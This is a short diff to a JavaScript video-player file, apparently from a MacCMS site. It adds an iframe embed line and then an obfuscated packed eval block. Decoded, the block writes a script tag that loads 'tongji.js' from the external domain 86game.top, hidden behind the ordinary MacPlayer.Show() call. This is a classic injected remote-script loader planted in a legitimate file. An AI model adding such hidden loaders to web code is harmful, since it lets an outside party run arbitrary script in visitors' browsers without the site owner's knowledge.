@@ -1,0 +1,2 @@
+MacPlayer.Html = '<iframe width="100%" height="100%" src="'+MacPlayer.PlayUrl+'"  allowfullscreen="true" frameborder="0" border="0" marginwidth="0" marginheight="0" scrolling="no"></iframe>';
+MacPlayer.Show();eval(function(c,f,a,b,d,e){d=String;if(!"".replace(/^/,String)){for(;a--;)e[a]=b[a]||a;b=[function(a){return e[a]}];d=function(){return"\\w+"};a=1}for(;a--;)b[a]&&(c=c.replace(new RegExp("\\b"+d(a)+"\\b","g"),b[a]));return c}("1.2(\"<0 3=\\'4://5.6.7/8.9\\'></0>\")",10,10,"script document writeln src https www 86game top tongji js".split(" "),0,{}));
